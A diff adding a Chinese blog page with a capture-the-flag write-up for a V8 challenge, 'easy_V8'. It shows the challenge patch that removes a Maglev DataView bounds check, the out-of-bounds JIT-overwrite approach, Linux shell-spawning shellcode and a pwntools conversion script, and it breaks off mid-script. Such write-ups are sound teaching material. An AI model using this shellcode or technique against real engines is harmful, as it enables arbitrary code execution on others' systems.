@@ -1,0 +1,413 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta http-equiv="Content-Security-Policy" content="default-src * 'unsafe-inline' 'unsafe-eval' data: blob:;">
+    <title>jqctf 2025 easy_V8</title>
+    <link rel="icon" type="image/svg+xml" href="/favicon.svg">
+    <link rel="stylesheet" href="style.css">
+</head>
+<body>
+    <header>
+        <nav class="site-nav">
+            <a href="./index.html" class="nav-link">/home</a>
+            <span class="nav-separator">|</span>
+            <a href="./about.html" class="nav-link">/about</a>
+        </nav>
+        <div class="terminal-prompt">
+            <span style="color:#666">[</span><span style="color:#fabd2f">ayoung</span><span style="color:#666">@</span><span style="color:#59adeb">lab</span> <span style="color:#83a598"><a href="./index.html" class="path-link">posts</a></span><span style="color:#666">]$</span> 
+            <span class="cmd">cat ./jqctf 2025 easy_V8.md</span><span class="cursor">█</span>
+        </div>
+        <h1 class="post-title">jqctf 2025 easy_V8</h1><div style="color: #666; font-size: 0.8rem; margin-bottom: 20px;">[Last modified: 2026-02-09]</div>
+    </header>
+    <div class="layout-grid">
+                <main><p>非预期
+<code>import('flag');</code></p>
+<h2 id="ti-mu">题目</h2><p>启动命令</p>
+<pre style="background-color:#2b303b;">
+<span style="color:#c0c5ce;">os.</span><span style="color:#8fa1b3;">system</span><span style="color:#c0c5ce;">(&quot;</span><span style="color:#a3be8c;">/home/ayoung/ctf/jqctf2025/v8/d8 --no-memory-protection-keys </span><span style="color:#c0c5ce;">&quot; + sys.argv[</span><span style="color:#d08770;">1</span><span style="color:#c0c5ce;">])
+</span></pre>
+<p>选项<code>--no-memory-protection-keys</code>，实际上是关闭了一个系统级别的内存防护机制，如果没有这个关闭选项，则无法如下文exp中做法一样直接修改函数最终跳转地址处指令，即使此处内存页显示为RWX，实际发生写入的时候会抛出异常（详见[[Intel MPK（Memory Protection Keys）]]）(<a href="https://groups.google.com/g/v8-reviews/c/vQyf4P407zc?pli=1">Issue 11714 in v8: [wasm] Write-protection of generated code with PKEYs/PKU</a>)</p>
+<p>给了一个patch文件
+删除了一些原本内置的方法，添加了两个函数</p>
+<ul>
+<li><code>Jing()</code> 获取v8中存储 JIT 编译代码的rwx页的起始地址</li>
+<li><code>Qi()</code> 获取传入的<code>ArrayBuffer</code>中数据指针<code>backing_store</code>的值</li>
+</ul>
+<p>并删去了 Maglev 编译器中<code>CheckJSDataViewBounds::GenerateCode()</code>函数中的边界检查</p>
+<p>原本当<code>__ subq(byte_length, Immediate(element_size - 1));</code>即<code>byte_length-(element_size-1)</code>为负值，也即操作数据长度大于<code>DataView</code>对应元素时，触发<code>__ EmitEagerDeoptIf(negative, DeoptimizeReason::kOutOfBounds, this);</code>，抛出<code>kOutOfBounds</code>越界错误</p>
+<p>Maglev是介于Ignition（解释器）和TurboFan（优化编译器），通常在函数执行一定次数后触发
+当构造函数触发Maglev编译可以用<code>DataView</code>越界读写</p>
+<pre style="background-color:#2b303b;">
+<span style="color:#c0c5ce;">diff --git a/src/d8/d8.cc b/src/d8/d8.cc
+</span><span style="color:#c0c5ce;">index 65d716745d1..bce2e5f6dc0 100644
+</span><span style="color:#c0c5ce;">--- a/src/d8/d8.cc
+</span><span style="color:#c0c5ce;">+++ b/src/d8/d8.cc
+</span><span style="color:#c0c5ce;">@@ -3776,6 +3776,44 @@ void Shell::Version(const v8::FunctionCallbackInfo&lt;v8::Value&gt;&amp; info) {
+</span><span style="color:#c0c5ce;">           .ToLocalChecked());
+</span><span style="color:#c0c5ce;"> }
+</span><span style="color:#c0c5ce;"> 
+</span><span style="color:#a3be8c;">+void Shell::Jing(const v8::FunctionCallbackInfo&lt;v8::Value&gt;&amp; info) {
+</span><span style="color:#a3be8c;">+  v8::Isolate* isolate = info.GetIsolate();
+</span><span style="color:#a3be8c;">+  i::Isolate* i_isolate = reinterpret_cast&lt;i::Isolate*&gt;(isolate);
+</span><span style="color:#a3be8c;">+  auto rwx_page = i_isolate-&gt;heap()-&gt;code_space()-&gt;first_page();
+</span><span style="color:#a3be8c;">+
+</span><span style="color:#a3be8c;">+  if(rwx_page != NULL) {
+</span><span style="color:#a3be8c;">+    i::Address rwx_addr = rwx_page-&gt;area_start();
+</span><span style="color:#a3be8c;">+    info.GetReturnValue().Set(v8::BigInt::NewFromUnsigned(isolate, rwx_addr));
+</span><span style="color:#a3be8c;">+  } else {
+</span><span style="color:#a3be8c;">+    info.GetReturnValue().Set(Undefined(isolate));
+</span><span style="color:#a3be8c;">+  }
+</span><span style="color:#a3be8c;">+}
+</span><span style="color:#a3be8c;">+
+</span><span style="color:#a3be8c;">+void Shell::Qi(const v8::FunctionCallbackInfo&lt;v8::Value&gt;&amp; info) {
+</span><span style="color:#a3be8c;">+  v8::Isolate* isolate = info.GetIsolate();
+</span><span style="color:#a3be8c;">+  HandleScope scope(isolate);
+</span><span style="color:#a3be8c;">+
+</span><span style="color:#a3be8c;">+  if(info.Length() &lt; 1) {
+</span><span style="color:#a3be8c;">+    info.GetReturnValue().Set(Undefined(isolate));
+</span><span style="color:#a3be8c;">+    return;
+</span><span style="color:#a3be8c;">+  }
+</span><span style="color:#a3be8c;">+  v8::Local&lt;v8::Value&gt; arg = info[0];
+</span><span style="color:#a3be8c;">+
+</span><span style="color:#a3be8c;">+  if (!arg-&gt;IsArrayBuffer()) {
+</span><span style="color:#a3be8c;">+    info.GetReturnValue().Set(Undefined(isolate));
+</span><span style="color:#a3be8c;">+    return;
+</span><span style="color:#a3be8c;">+  }
+</span><span style="color:#a3be8c;">+  v8::Local&lt;v8::ArrayBuffer&gt; buffer = arg.As&lt;v8::ArrayBuffer&gt;();
+</span><span style="color:#a3be8c;">+
+</span><span style="color:#a3be8c;">+  std::shared_ptr&lt;v8::BackingStore&gt; backing_store = buffer-&gt;GetBackingStore();
+</span><span style="color:#a3be8c;">+  void* data_ptr = backing_store-&gt;Data();
+</span><span style="color:#a3be8c;">+
+</span><span style="color:#a3be8c;">+  // 将指针转换为一个整数，以便创建 BigInt
+</span><span style="color:#a3be8c;">+  uintptr_t address_value = reinterpret_cast&lt;uintptr_t&gt;(data_ptr);
+</span><span style="color:#a3be8c;">+  v8::Local&lt;v8::BigInt&gt; result = v8::BigInt::NewFromUnsigned(isolate, address_value);
+</span><span style="color:#a3be8c;">+  info.GetReturnValue().Set(result);
+</span><span style="color:#a3be8c;">+}
+</span><span style="color:#a3be8c;">+
+</span><span style="color:#c0c5ce;"> void Shell::ReportException(Isolate* isolate, Local&lt;v8::Message&gt; message,
+</span><span style="color:#c0c5ce;">                             Local&lt;v8::Value&gt; exception_obj) {
+</span><span style="color:#c0c5ce;">   HandleScope handle_scope(isolate);
+</span><span style="color:#c0c5ce;">@@ -4018,51 +4056,55 @@ Local&lt;FunctionTemplate&gt; Shell::CreateNodeTemplates(
+</span><span style="color:#c0c5ce;"> 
+</span><span style="color:#c0c5ce;"> Local&lt;ObjectTemplate&gt; Shell::CreateGlobalTemplate(Isolate* isolate) {
+</span><span style="color:#c0c5ce;">   Local&lt;ObjectTemplate&gt; global_template = ObjectTemplate::New(isolate);
+</span><span style="color:#bf616a;">-  global_template-&gt;Set(Symbol::GetToStringTag(isolate),
+</span><span style="color:#bf616a;">-                       String::NewFromUtf8Literal(isolate, &quot;global&quot;));
+</span><span style="color:#bf616a;">-  global_template-&gt;Set(isolate, &quot;version&quot;,
+</span><span style="color:#bf616a;">-                       FunctionTemplate::New(isolate, Version));
+</span><span style="color:#a3be8c;">+  global_template-&gt;Set(isolate, &quot;Jing&quot;,
+</span><span style="color:#a3be8c;">+                       FunctionTemplate::New(isolate, Jing));
+</span><span style="color:#a3be8c;">+  global_template-&gt;Set(isolate, &quot;Qi&quot;,
+</span><span style="color:#a3be8c;">+                       FunctionTemplate::New(isolate, Qi));
+</span><span style="color:#a3be8c;">+//   global_template-&gt;Set(Symbol::GetToStringTag(isolate),
+</span><span style="color:#a3be8c;">+//                        String::NewFromUtf8Literal(isolate, &quot;global&quot;));
+</span><span style="color:#a3be8c;">+//   global_template-&gt;Set(isolate, &quot;version&quot;,
+</span><span style="color:#a3be8c;">+//                        FunctionTemplate::New(isolate, Version));
+</span><span style="color:#c0c5ce;"> 
+</span><span style="color:#c0c5ce;">   global_template-&gt;Set(isolate, &quot;print&quot;, FunctionTemplate::New(isolate, Print));
+</span><span style="color:#bf616a;">-  global_template-&gt;Set(isolate, &quot;printErr&quot;,
+</span><span style="color:#bf616a;">-                       FunctionTemplate::New(isolate, PrintErr));
+</span><span style="color:#bf616a;">-  global_template-&gt;Set(isolate, &quot;write&quot;,
+</span><span style="color:#bf616a;">-                       FunctionTemplate::New(isolate, WriteStdout));
+</span><span style="color:#bf616a;">-  if (!i::v8_flags.fuzzing) {
+</span><span style="color:#bf616a;">-    global_template-&gt;Set(isolate, &quot;writeFile&quot;,
+</span><span style="color:#bf616a;">-                         FunctionTemplate::New(isolate, WriteFile));
+</span><span style="color:#bf616a;">-  }
+</span><span style="color:#bf616a;">-  global_template-&gt;Set(isolate, &quot;read&quot;,
+</span><span style="color:#bf616a;">-                       FunctionTemplate::New(isolate, ReadFile));
+</span><span style="color:#bf616a;">-  global_template-&gt;Set(isolate, &quot;readbuffer&quot;,
+</span><span style="color:#bf616a;">-                       FunctionTemplate::New(isolate, ReadBuffer));
+</span><span style="color:#bf616a;">-  global_template-&gt;Set(isolate, &quot;readline&quot;,
+</span><span style="color:#bf616a;">-                       FunctionTemplate::New(isolate, ReadLine));
+</span><span style="color:#bf616a;">-  global_template-&gt;Set(isolate, &quot;load&quot;,
+</span><span style="color:#bf616a;">-                       FunctionTemplate::New(isolate, ExecuteFile));
+</span><span style="color:#bf616a;">-  global_template-&gt;Set(isolate, &quot;setTimeout&quot;,
+</span><span style="color:#bf616a;">-                       FunctionTemplate::New(isolate, SetTimeout));
+</span><span style="color:#bf616a;">-  // Some Emscripten-generated code tries to call &#39;quit&#39;, which in turn would
+</span><span style="color:#bf616a;">-  // call C&#39;s exit(). This would lead to memory leaks, because there is no way
+</span><span style="color:#bf616a;">-  // we can terminate cleanly then, so we need a way to hide &#39;quit&#39;.
+</span><span style="color:#bf616a;">-  if (!options.omit_quit) {
+</span><span style="color:#bf616a;">-    global_template-&gt;Set(isolate, &quot;quit&quot;, FunctionTemplate::New(isolate, Quit));
+</span><span style="color:#bf616a;">-  }
+</span><span style="color:#bf616a;">-  global_template-&gt;Set(isolate, &quot;Realm&quot;, Shell::CreateRealmTemplate(isolate));
+</span><span style="color:#bf616a;">-  global_template-&gt;Set(isolate, &quot;performance&quot;,
+</span><span style="color:#bf616a;">-                       Shell::CreatePerformanceTemplate(isolate));
+</span><span style="color:#bf616a;">-  global_template-&gt;Set(isolate, &quot;Worker&quot;, Shell::CreateWorkerTemplate(isolate));
+</span><span style="color:#bf616a;">-
+</span><span style="color:#bf616a;">-  // Prevent fuzzers from creating side effects.
+</span><span style="color:#bf616a;">-  if (!i::v8_flags.fuzzing) {
+</span><span style="color:#bf616a;">-    global_template-&gt;Set(isolate, &quot;os&quot;, Shell::CreateOSTemplate(isolate));
+</span><span style="color:#bf616a;">-  }
+</span><span style="color:#bf616a;">-  global_template-&gt;Set(isolate, &quot;d8&quot;, Shell::CreateD8Template(isolate));
+</span><span style="color:#bf616a;">-
+</span><span style="color:#bf616a;">-  if (i::v8_flags.expose_async_hooks) {
+</span><span style="color:#bf616a;">-    global_template-&gt;Set(isolate, &quot;async_hooks&quot;,
+</span><span style="color:#bf616a;">-                         Shell::CreateAsyncHookTemplate(isolate));
+</span><span style="color:#bf616a;">-  }
+</span><span style="color:#a3be8c;">+//   global_template-&gt;Set(isolate, &quot;printErr&quot;,
+</span><span style="color:#a3be8c;">+//                        FunctionTemplate::New(isolate, PrintErr));
+</span><span style="color:#a3be8c;">+//   global_template-&gt;Set(isolate, &quot;write&quot;,
+</span><span style="color:#a3be8c;">+//                        FunctionTemplate::New(isolate, WriteStdout));
+</span><span style="color:#a3be8c;">+//   if (!i::v8_flags.fuzzing) {
+</span><span style="color:#a3be8c;">+//     global_template-&gt;Set(isolate, &quot;writeFile&quot;,
+</span><span style="color:#a3be8c;">+//                          FunctionTemplate::New(isolate, WriteFile));
+</span><span style="color:#a3be8c;">+//   }
+</span><span style="color:#a3be8c;">+//   global_template-&gt;Set(isolate, &quot;read&quot;,
+</span><span style="color:#a3be8c;">+//                        FunctionTemplate::New(isolate, ReadFile));
+</span><span style="color:#a3be8c;">+//   global_template-&gt;Set(isolate, &quot;readbuffer&quot;,
+</span><span style="color:#a3be8c;">+//                        FunctionTemplate::New(isolate, ReadBuffer));
+</span><span style="color:#a3be8c;">+//   global_template-&gt;Set(isolate, &quot;readline&quot;,
+</span><span style="color:#a3be8c;">+//                        FunctionTemplate::New(isolate, ReadLine));
+</span><span style="color:#a3be8c;">+//   global_template-&gt;Set(isolate, &quot;load&quot;,
+</span><span style="color:#a3be8c;">+//                        FunctionTemplate::New(isolate, ExecuteFile));
+</span><span style="color:#a3be8c;">+//   global_template-&gt;Set(isolate, &quot;setTimeout&quot;,
+</span><span style="color:#a3be8c;">+//                        FunctionTemplate::New(isolate, SetTimeout));
+</span><span style="color:#a3be8c;">+//   // Some Emscripten-generated code tries to call &#39;quit&#39;, which in turn would
+</span><span style="color:#a3be8c;">+//   // call C&#39;s exit(). This would lead to memory leaks, because there is no way
+</span><span style="color:#a3be8c;">+//   // we can terminate cleanly then, so we need a way to hide &#39;quit&#39;.
+</span><span style="color:#a3be8c;">+//   if (!options.omit_quit) {
+</span><span style="color:#a3be8c;">+//     global_template-&gt;Set(isolate, &quot;quit&quot;, FunctionTemplate::New(isolate, Quit));
+</span><span style="color:#a3be8c;">+//   }
+</span><span style="color:#a3be8c;">+//   global_template-&gt;Set(isolate, &quot;Realm&quot;, Shell::CreateRealmTemplate(isolate));
+</span><span style="color:#a3be8c;">+//   global_template-&gt;Set(isolate, &quot;performance&quot;,
+</span><span style="color:#a3be8c;">+//                        Shell::CreatePerformanceTemplate(isolate));
+</span><span style="color:#a3be8c;">+//   global_template-&gt;Set(isolate, &quot;Worker&quot;, Shell::CreateWorkerTemplate(isolate));
+</span><span style="color:#a3be8c;">+
+</span><span style="color:#a3be8c;">+//   // Prevent fuzzers from creating side effects.
+</span><span style="color:#a3be8c;">+//   if (!i::v8_flags.fuzzing) {
+</span><span style="color:#a3be8c;">+//     global_template-&gt;Set(isolate, &quot;os&quot;, Shell::CreateOSTemplate(isolate));
+</span><span style="color:#a3be8c;">+//   }
+</span><span style="color:#a3be8c;">+//   global_template-&gt;Set(isolate, &quot;d8&quot;, Shell::CreateD8Template(isolate));
+</span><span style="color:#a3be8c;">+
+</span><span style="color:#a3be8c;">+//   if (i::v8_flags.expose_async_hooks) {
+</span><span style="color:#a3be8c;">+//     global_template-&gt;Set(isolate, &quot;async_hooks&quot;,
+</span><span style="color:#a3be8c;">+//                          Shell::CreateAsyncHookTemplate(isolate));
+</span><span style="color:#a3be8c;">+//   }
+</span><span style="color:#c0c5ce;"> 
+</span><span style="color:#c0c5ce;">   return global_template;
+</span><span style="color:#c0c5ce;"> }
+</span><span style="color:#c0c5ce;">diff --git a/src/d8/d8.h b/src/d8/d8.h
+</span><span style="color:#c0c5ce;">index 94dcfb5a23d..4721121688d 100644
+</span><span style="color:#c0c5ce;">--- a/src/d8/d8.h
+</span><span style="color:#c0c5ce;">+++ b/src/d8/d8.h
+</span><span style="color:#c0c5ce;">@@ -657,6 +657,8 @@ class Shell : public i::AllStatic {
+</span><span style="color:#c0c5ce;">   static void ScheduleTermination(
+</span><span style="color:#c0c5ce;">       const v8::FunctionCallbackInfo&lt;v8::Value&gt;&amp; info);
+</span><span style="color:#c0c5ce;">   static void Version(const v8::FunctionCallbackInfo&lt;v8::Value&gt;&amp; info);
+</span><span style="color:#a3be8c;">+  static void Jing(const v8::FunctionCallbackInfo&lt;v8::Value&gt;&amp; info);
+</span><span style="color:#a3be8c;">+  static void Qi(const v8::FunctionCallbackInfo&lt;v8::Value&gt;&amp; info);
+</span><span style="color:#c0c5ce;">   static void WriteFile(const v8::FunctionCallbackInfo&lt;v8::Value&gt;&amp; info);
+</span><span style="color:#c0c5ce;">   static void ReadFile(const v8::FunctionCallbackInfo&lt;v8::Value&gt;&amp; info);
+</span><span style="color:#c0c5ce;">   static void CreateWasmMemoryMapDescriptor(
+</span><span style="color:#c0c5ce;">diff --git a/src/maglev/x64/maglev-ir-x64.cc b/src/maglev/x64/maglev-ir-x64.cc
+</span><span style="color:#c0c5ce;">index ef1f9937105..4f3bbe6756f 100644
+</span><span style="color:#c0c5ce;">--- a/src/maglev/x64/maglev-ir-x64.cc
+</span><span style="color:#c0c5ce;">+++ b/src/maglev/x64/maglev-ir-x64.cc
+</span><span style="color:#c0c5ce;">@@ -113,7 +113,7 @@ void CheckJSDataViewBounds::GenerateCode(MaglevAssembler* masm,
+</span><span style="color:#c0c5ce;">   int element_size = compiler::ExternalArrayElementSize(element_type_);
+</span><span style="color:#c0c5ce;">   if (element_size &gt; 1) {
+</span><span style="color:#c0c5ce;">     __ subq(byte_length, Immediate(element_size - 1));
+</span><span style="color:#bf616a;">-    __ EmitEagerDeoptIf(negative, DeoptimizeReason::kOutOfBounds, this);
+</span><span style="color:#a3be8c;">+//     __ EmitEagerDeoptIf(negative, DeoptimizeReason::kOutOfBounds, this);
+</span><span style="color:#c0c5ce;">   }
+</span><span style="color:#c0c5ce;">   __ cmpl(index, byte_length);
+</span><span style="color:#c0c5ce;">   __ EmitEagerDeoptIf(above_equal, DeoptimizeReason::kOutOfBounds, this);
+</span></pre>
+<h2 id="jie-ti">解题</h2><p>用下面代码强制触发 JIT 编译来初始化代码空间</p>
+<pre style="background-color:#2b303b;">
+<span style="color:#65737e;">// 1. 创建需要优化的大量函数
+</span><span style="color:#b48ead;">const </span><span style="color:#bf616a;">functions </span><span style="color:#c0c5ce;">= [];
+</span><span style="color:#b48ead;">for </span><span style="color:#c0c5ce;">(</span><span style="color:#b48ead;">let </span><span style="color:#bf616a;">i </span><span style="color:#c0c5ce;">= </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">; </span><span style="color:#bf616a;">i </span><span style="color:#c0c5ce;">&lt; </span><span style="color:#d08770;">1000</span><span style="color:#c0c5ce;">; </span><span style="color:#bf616a;">i</span><span style="color:#c0c5ce;">++) {
+</span><span style="color:#c0c5ce;">    </span><span style="color:#bf616a;">functions</span><span style="color:#c0c5ce;">.</span><span style="color:#96b5b4;">push</span><span style="color:#c0c5ce;">(new </span><span style="color:#ebcb8b;">Function</span><span style="color:#c0c5ce;">(`</span><span style="color:#a3be8c;">return </span><span style="color:#c0c5ce;">${</span><span style="color:#bf616a;">i</span><span style="color:#c0c5ce;">}</span><span style="color:#a3be8c;"> * 2</span><span style="color:#c0c5ce;">`));
+</span><span style="color:#c0c5ce;">}
+</span><span style="color:#65737e;">// 2. 触发优化编译（加热函数）
+</span><span style="color:#b48ead;">for </span><span style="color:#c0c5ce;">(</span><span style="color:#b48ead;">let </span><span style="color:#bf616a;">i </span><span style="color:#c0c5ce;">= </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">; </span><span style="color:#bf616a;">i </span><span style="color:#c0c5ce;">&lt; </span><span style="color:#d08770;">100000</span><span style="color:#c0c5ce;">; </span><span style="color:#bf616a;">i</span><span style="color:#c0c5ce;">++) {
+</span><span style="color:#c0c5ce;">    </span><span style="color:#bf616a;">functions</span><span style="color:#c0c5ce;">[</span><span style="color:#bf616a;">i </span><span style="color:#c0c5ce;">% </span><span style="color:#bf616a;">functions</span><span style="color:#c0c5ce;">.length]();
+</span><span style="color:#c0c5ce;">}
+</span></pre>
+<p>前面提到，Maglev编译需要函数执行一定次数后才能触发
+即先创建一个不会越界的 arrybuffer 多次循环写入操作，之后再对小的 arraybuffer 进行越界写操作（setFloat64）就能够通过Maglev编译，绕过边界检查</p>
+<p>最后漏洞利用思路即通过越界覆写内存中JIT代码，其在的rwx页面地址可以通过题目提供的接口获得，之后通过DebugPrint打印<code>functions[0]</code>调试信息</p>
+<p>其中<code>code: 0x19d2002002a9 &lt;Code BASELINE&gt;</code>即指示对应jit代码的位置</p>
+<pre style="background-color:#2b303b;">
+<span style="color:#c0c5ce;">DebugPrint: 0x19d2001d66e9: [Function] in OldSpace
+</span><span style="color:#c0c5ce;"> - map: 0x19d200043595 &lt;Map[32](HOLEY_ELEMENTS)&gt; [FastProperties]
+</span><span style="color:#c0c5ce;"> - prototype: 0x19d2000436c1 &lt;JSFunction (sfi = 0x19d200041a5d)&gt;
+</span><span style="color:#c0c5ce;"> - elements: 0x19d2000007bd &lt;FixedArray[0]&gt; [HOLEY_ELEMENTS]
+</span><span style="color:#c0c5ce;"> - function prototype: 
+</span><span style="color:#c0c5ce;"> - initial_map: 
+</span><span style="color:#c0c5ce;"> - shared_info: 0x19d200059911 &lt;SharedFunctionInfo&gt;
+</span><span style="color:#c0c5ce;"> - name: 0x19d200000049 &lt;String[0]: #&gt;
+</span><span style="color:#c0c5ce;"> - formal_parameter_count: 1
+</span><span style="color:#c0c5ce;"> - kind: NormalFunction
+</span><span style="color:#c0c5ce;"> - context: 0x19d200042ea9 &lt;NativeContext[301]&gt;
+</span><span style="color:#c0c5ce;"> - code: 0x19d2002002a9 &lt;Code BASELINE&gt;
+</span><span style="color:#c0c5ce;"> - dispatch_handle: 0x12e500
+</span><span style="color:#c0c5ce;"> - source code: (
+</span><span style="color:#c0c5ce;">) {
+</span><span style="color:#c0c5ce;">return 0 * 2
+</span><span style="color:#c0c5ce;">}
+</span></pre>
+<p>查看对应内存 可以找到对应代码地址（可以通过for循环延时挂调试jit代码执行）
+<img src="./images/Pasted%20image%2020250728184533.png" alt="" /></p>
+<p>另外可以通过 job 查看code信息，<code>instruction_start</code>即指令开始地址</p>
+<pre style="background-color:#2b303b;">
+<span style="color:#c0c5ce;">pwndbg&gt; job 0x23f8002c009d
+</span><span style="color:#c0c5ce;">0x23f8002c009d: [Code]
+</span><span style="color:#c0c5ce;"> - map: 0x23f800000d61 &lt;Map[64](CODE_TYPE)&gt;
+</span><span style="color:#c0c5ce;"> - kind: MAGLEV
+</span><span style="color:#c0c5ce;"> - deoptimization_data_or_interpreter_data: 0x23f8002c0011 &lt;Other heap object (PROTECTED_FIXED_ARRAY_TYPE)&gt;
+</span><span style="color:#c0c5ce;"> - position_table: 0x23f800180011 &lt;Other heap object (TRUSTED_BYTE_ARRAY_TYPE)&gt;
+</span><span style="color:#c0c5ce;"> - instruction_stream: 0x5789c8ac0031 &lt;InstructionStream MAGLEV&gt;
+</span><span style="color:#c0c5ce;"> - instruction_start: 0x5789c8ac0040
+</span><span style="color:#c0c5ce;"> - is_turbofanned: 0
+</span><span style="color:#c0c5ce;"> - stack_slots: 5
+</span><span style="color:#c0c5ce;"> - marked_for_deoptimization: 0
+</span><span style="color:#c0c5ce;"> - embedded_objects_cleared: 0
+</span><span style="color:#c0c5ce;"> - can_have_weak_objects: 1
+</span><span style="color:#c0c5ce;"> - instruction_size: 152
+</span><span style="color:#c0c5ce;"> - metadata_size: 24
+</span><span style="color:#c0c5ce;"> - inlined_bytecode_size: 0
+</span><span style="color:#c0c5ce;"> - osr_offset: -1
+</span><span style="color:#c0c5ce;"> - handler_table_offset: 24
+</span><span style="color:#c0c5ce;"> - unwinding_info_offset: 24
+</span><span style="color:#c0c5ce;"> - code_comments_offset: 24
+</span><span style="color:#c0c5ce;"> - instruction_stream.relocation_info: 0x23f8002c0089 &lt;Other heap object (TRUSTED_BYTE_ARRAY_TYPE)&gt;
+</span><span style="color:#c0c5ce;"> - instruction_stream.body_size: 176
+</span><span style="color:#c0c5ce;">
+</span><span style="color:#c0c5ce;">--- Disassembly: ---
+</span><span style="color:#c0c5ce;">...
+</span></pre>
+<p>最后就是计算偏移，越界通过浮点数覆盖rwx处代码，最后调用<code>functions[0]()</code>触发执行
+这里的偏移会因为代码变化而小范围变化，因为最后要把调试用的指令都去掉，需要小范围手动爆破一下</p>
+<p>linux可用shellcode</p>
+<pre style="background-color:#2b303b;">
+<span style="color:#65737e;">//Linux x64
+</span><span style="color:#b48ead;">var </span><span style="color:#bf616a;">shellcode </span><span style="color:#c0c5ce;">= [  
+</span><span style="color:#c0c5ce;">  </span><span style="color:#d08770;">0x2fbb485299583b6a</span><span style="color:#bf616a;">n</span><span style="color:#c0c5ce;">,  
+</span><span style="color:#c0c5ce;">  </span><span style="color:#d08770;">0x5368732f6e69622f</span><span style="color:#bf616a;">n</span><span style="color:#c0c5ce;">,  
+</span><span style="color:#c0c5ce;">  </span><span style="color:#d08770;">0x050f5e5457525f54</span><span style="color:#bf616a;">n  
+</span><span style="color:#c0c5ce;">];  
+</span></pre>
+<p>将字节码转为 js 大整数数组脚本</p>
+<pre style="background-color:#2b303b;">
+<span style="color:#b48ead;">from </span><span style="color:#c0c5ce;">pwn </span><span style="color:#b48ead;">import </span><span style="color:#d08770;">*
+</span><span style="color:#c0c5ce;"> 
+</span><span style="color:#c0c5ce;">context.arch = &#39;</span><span style="color:#a3be8c;">amd64</span><span style="color:#c0c5ce;">&#39;
+</span><span style="color:#c0c5ce;">context.os = &#39;</span><span style="color:#a3be8c;">linux</span><span style="color:#c0c5ce;">&#39;
+</span><span style="color:#c0c5ce;"> 
+</span><span style="color:#c0c5ce;">shellcode = shellcraft.</span><span style="color:#8fa1b3;">sh</span><span style="color:#c0c5ce;">()
+</span><span style="color:#c0c5ce;">output = </span><span style="color:#8fa1b3;">asm</span><span style="color:#c0c5ce;">(shellcode)
+</span><span style="color:#96b5b4;">print</span><span style="color:#c0c5ce;">(</span><span style="color:#b48ead;">f</span><span style="color:#c0c5ce;">&quot;</span><span style="color:#a3be8c;">Shellcode 长度: </span><span style="color:#c0c5ce;">{</span><span style="color:#96b5b4;">len</span><span style="color:#c0c5ce;">(output)}</span><span style="color:#a3be8c;"> 字节</span><span style="color:#c0c5ce;">&quot;)
+</span><span style="color:#c0c5ce;"> 
+</span><span style="color:#b48ead;">if </span><span style="color:#96b5b4;">len</span><span style="color:#c0c5ce;">(output) % </span><span style="color:#d08770;">8 </span><span style="color:#c0c5ce;">!= </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">:
+</span><span style="color:#c0c5ce;">    padding = </span><span style="color:#d08770;">8 </span><span style="color:#c0c5ce;">- (</span><span style="color:#96b5b4;">len</span><span style="color:#c0c5ce;">(output) % </span><span style="color:#d08770;">8</span><span style="color:#c0c5ce;">)
+</span><span style="color:#c0c5ce;">    output += </span><span style="color:#b48ead;">b</span><span style="color:#c0c5ce;">&#39;</span><span style="color:#96b5b4;">\x00</span><span style="color:#c0c5ce;">&#39; * padding
+</span><span style="color:#c0c5ce;">    </span><span style="color:#96b5b4;">print</span><span style="color:#c0c5ce;">(</span><span style="color:#b48ead;">f</span><span style="color:#c0c5ce;">&quot;</span><span style="color:#a3be8c;">已填充 </span><span style="color:#c0c5ce;">{padding}</span><span style="color:#a3be8c;"> 字节，总长度: </span><span style="color:#c0c5ce;">{</span><span style="color:#96b5b4;">len</span><span style="color:#c0c5ce;">(output)}</span><span style="color:#a3be8c;"> 字节</span><span style="color:#c0c5ce;">&quot;)
+</span><span style="color:#c0c5ce;"> 
+</span><span style="color:#c0c5ce;">bigint_array = []
+</span><span style="color:#b48ead;">for </span><span style="color:#c0c5ce;">i </span><span style="color:#b48ead;">in </span><span style="color:#96b5b4;">range</span><span style="color:#c0c5ce;">(</span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">, </span><span style="color:#96b5b4;">len</span><span style="color:#c0c5ce;">(output), </span><span style="color:#d08770;">8</span><span style="color:#c0c5ce;">):
+</span><span style="color:#c0c5ce;">    chunk = output[i:i+</span><span style="color:#d08770;">8</span><span style="color:#c0c5ce;">]
+</span><span style="color:#c0c5ce;">    value = int.</span><span style="color:#8fa1b3;">from_bytes</span><span style="color:#c0c5ce;">(chunk, &#39;</span><span style="color:#a3be8c;">little</span><span style="color:#c0c5ce;">&#39;)
+</span><span style="color:#c0c5ce;">    bigint_array.</span><span style="color:#8fa1b3;">append</span><span style="color:#c0c5ce;">(</span><span style="color:#b48ead;">f</span><span style="color:#c0c5ce;">&quot;{value}</span><span style="color:#a3be8c;">n</span><span style="color:#c0c5ce;">&quot;)
+</span><span style="color:#c0c5ce;"> 
+</span><span style="color:#c0c5ce;">js_array = &quot;</span><span style="color:#a3be8c;">var shellcode = [</span><span style="color:#96b5b4;">\n    </span><span style="color:#c0c5ce;">&quot; + &quot;</span><span style="color:#a3be8c;">,</span><span style="color:#96b5b4;">\n    </span><span style="color:#c0c5ce;">&quot;.</span><span style="color:#8fa1b3;">join</span><span style="color:#c0c5ce;">(bigint_array) + &quot;</span><span style="color:#96b5b4;">\n</span><span style="color:#a3be8c;">];</span><span style="color:#c0c5ce;">&quot;
+</span><span style="color:#c0c5ce;"> 
+</span><span style="color:#96b5b4;">print</span><span style="color:#c0c5ce;">(&quot;</span><span style="color:#96b5b4;">\n</span><span style="color:#a3be8c;">JavaScript BigInt 数组格式:</span><span style="color:#c0c5ce;">&quot;)
+</span><span style="color:#96b5b4;">print</span><span style="color:#c0c5ce;">(js_array)
+</span></pre>
+<p>将大整数数组转为浮点数数组脚本</p>
+<pre style="background-color:#2b303b;">
+<span style="color:#b48ead;">function </span><span style="color:#8fa1b3;">convertToFloat64</span><span style="color:#c0c5ce;">(bigIntArray) {
+</span><span style="color:#c0c5ce;">  </span><span style="color:#65737e;">// 创建足够大的 ArrayBuffer（每个元素需要 8 字节）
